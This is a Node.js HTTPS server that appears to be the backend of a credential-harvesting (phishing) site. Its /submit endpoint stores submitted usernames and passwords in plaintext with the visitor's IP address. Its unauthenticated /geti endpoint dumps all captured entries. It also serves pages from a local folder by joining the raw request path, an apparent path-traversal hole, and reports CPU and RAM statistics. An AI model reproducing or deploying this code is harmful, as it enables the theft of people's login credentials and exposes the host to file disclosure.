const https = require('https');
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');

const app = express();
const port = 443;
const ip = '0.0.0.0';

const options = {
    key: fs.readFileSync('./certs/server.key'),
    cert: fs.readFileSync('./certs/server.crt')
};

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());

app.post('/submit', (req, res) => {
    const { username, password, time } = req.body;
    const ip = req.ip;

    const newData = {
        "ip": `${ip}`,
        "time": `${time}`,
        "account": `${username}`,
        "password": `${password}`
    };

    fs.readFile('./account.json', 'utf8', (err, data) => {
        if (err) {
            return res.status(500).send(`讀取檔案錯誤: ${err.message}`);
        }

        let usersData = JSON.parse(data);
        usersData.push(newData);
        fs.writeFile('./account.json', JSON.stringify(usersData, null, 2), (err) => {
            if (err) {
                return res.status(500).send('寫入檔案錯誤');
            }
        });
    });
});

app.get('/geti', (req, res) => {
    fs.readFile('./account.json', 'utf8', (err, data) => {
        if (err) {
            return res.status(500).send(`讀取檔案錯誤: ${err.message}`);
        }

        let usersData = JSON.parse(data);
        res.json(usersData);
    });
});

function getCpuTemperature() {
    const temperature = fs.readFileSync('/sys/class/thermal/thermal_zone0/temp', 'utf8');
    return (parseInt(temperature) / 1000).toFixed(2);
}

function getCpuUsage() {
    return new Promise((resolve, reject) => {
        exec('top -bn1 | grep "Cpu(s)"', (err, stdout, stderr) => {
            if (err) {
                reject(err);
            }
            const matches = stdout.match(/(\d+\.\d+)\s*id/);
            if (matches && matches[1]) {
                const idle = parseFloat(matches[1]);
                const cpuUsage = (100 - idle).toFixed(2);
                resolve(cpuUsage);
            } else {
                reject('Unable to parse CPU usage');
            }
        });
    });
}

function getRamUsage() {
    return new Promise((resolve, reject) => {
        exec('free -m', (err, stdout, stderr) => {
            if (err) {
                reject(err);
            }
            const lines = stdout.split('\n');
            const memStats = lines[1].split(/\s+/);
            const total = parseInt(memStats[1]);
            const used = parseInt(memStats[2]);
            const usedPercentage = ((used / total) * 100).toFixed(2);
            resolve(usedPercentage);
        });
    });
}

app.get('/system-info', async (req, res) => {
    try {
        const cpuTemp = getCpuTemperature();
        const cpuUsage = await getCpuUsage();
        const ramUsage = await getRamUsage();
        res.json({
            cpuTemperature: cpuTemp,
            cpuUsage: cpuUsage,
            ramUsage: ramUsage
        });
    } catch (error) {
        res.status(500).json({ error: 'Failed to get system info' });
    }
});

app.get('*', (req, res) => {
    let url = req.url;
    let filePath = path.join(__dirname, 'html', url);
    if (url === '/') {
        filePath = path.join(__dirname, 'html', 'index.html');
    }

    const extname = path.extname(filePath).toLowerCase();
    let contentType = 'text/plain';
    switch (extname) {
        case '.html': contentType = 'text/html'; break;
        case '.css': contentType = 'text/css'; break;
        case '.js': contentType = 'application/javascript'; break;
        case '.png': contentType = 'image/png'; break;
        case '.jpg':
        case '.jpeg': contentType = 'image/jpeg'; break;
        case '.gif': contentType = 'image/gif'; break;
    }

    fs.readFile(filePath, (error, data) => {
        if (error) {
            res.status(404).type('text/plain').send('找不到資源');
        } else {
            res.status(200).type(contentType).send(data);
        }
    });
});

https.createServer(options, app).listen(port, ip, () => {
    console.log(`HTTPS Server is running at https://${ip}:${port}`);
});
